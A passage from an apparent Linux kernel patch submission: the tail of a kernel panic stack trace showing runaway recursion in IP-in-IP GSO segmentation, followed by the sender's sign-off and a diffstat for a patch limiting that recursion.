+[   18.345039]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345040]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345042]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345043]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345045]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345047]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345048]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345050]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345051]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345053]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345054]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345056]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345057]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345059]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345060]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345281]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345282]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345284]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345285]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345287]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345288]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345290]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345291]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345293]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345295]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345296]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345298]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345299]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345301]  inet_gso_segment (net/ipv4/af_inet.c:1411)
+[   18.345302]  skb_mac_gso_segment (net/core/gso.c:53)
+[   18.345305]  __skb_gso_segment (net/core/gso.c:124)
+[   18.345306]  validate_xmit_skb.isra.0 (include/net/gso.h:83 net/core/dev.c:4044)
+[   18.345309]  __dev_queue_xmit (net/core/dev.c:4865)
+[   18.345312]  ip_finish_output2 (include/linux/netdevice.h:3446 include/net/neighbour.h:544 include/net/neighbour.h:558 net/ipv4/ip_output.c:236)
+[   18.345315]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)
+[   18.345317]  ? __pfx_ip_finish_output (include/net/dst.h:470 (discriminator 7))
+[   18.345318]  iptunnel_xmit (net/ipv4/ip_tunnel_core.c:97)
+[   18.345321]  ip_tunnel_xmit (net/ipv4/ip_tunnel.c:848)
+[   18.345323]  ipip_tunnel_xmit (net/ipv4/ipip.c:316)
+[   18.345325]  dev_hard_start_xmit (include/linux/netdevice.h:5400 include/linux/netdevice.h:5409 net/core/dev.c:3889 net/core/dev.c:3905)
+[   18.345326]  ? validate_xmit_skb.isra.0 (net/core/dev.c:4067)
+[   18.345328]  __dev_queue_xmit (net/core/dev.c:4878)
+[   18.345375] Kernel panic - not syncing: Fatal exception in interrupt
+[   18.346542] Kernel Offset: 0x38800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
+[   19.982144] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---
+-----END crash log-----
+
+Best regards,
+Zihan Xi
+
+Zihan Xi (1):
+  net: gso: limit recursive IP-in-IP segmentation
+
+ include/net/gso.h       | 29 +++++++++++++++++++++++++++++
+ net/core/gso.c          |  7 +++++--
+ net/ipv4/af_inet.c      |  7 ++++++-
+ net/ipv4/esp4_offload.c |  9 +++++++--
+ net/ipv4/gre_offload.c  |  2 ++
+ net/ipv4/udp_offload.c  |  4 +++-
+ net/ipv6/esp6_offload.c |  9 +++++++--
+ net/ipv6/ip6_offload.c  | 11 ++++++++++-
+ net/mpls/mpls_gso.c     |  2 ++
+ net/nsh/nsh.c           |  2 ++
+ 10 files changed, 73 insertions(+), 9 deletions(-)
+
+-- 
+2.55.0.windows.3
